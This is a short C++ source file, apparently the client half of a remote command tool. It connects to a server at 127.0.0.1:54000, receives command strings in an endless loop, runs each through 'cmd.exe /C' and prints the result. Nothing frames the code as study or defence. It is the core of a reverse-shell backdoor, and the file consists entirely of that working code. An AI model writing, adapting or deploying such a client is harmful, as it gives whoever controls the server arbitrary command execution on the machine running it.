#include <iostream>
#include <string>
#include "TCPClient.h"
#include "utils.h"

int main()
{
	TCPClient* conn = new TCPClient("127.0.0.1", 54000);
	conn->start_connection();
	while (true)
	{
		// recv command from server
		char* commandLine = conn->recv_data();
		std::cout << commandLine << std::endl;
		std::string c = "cmd.exe /C " + std::string(commandLine);
		std::string output = exec(c);
		std::cout << output << std::endl;
		delete[] commandLine;

	}
	return 0;
}
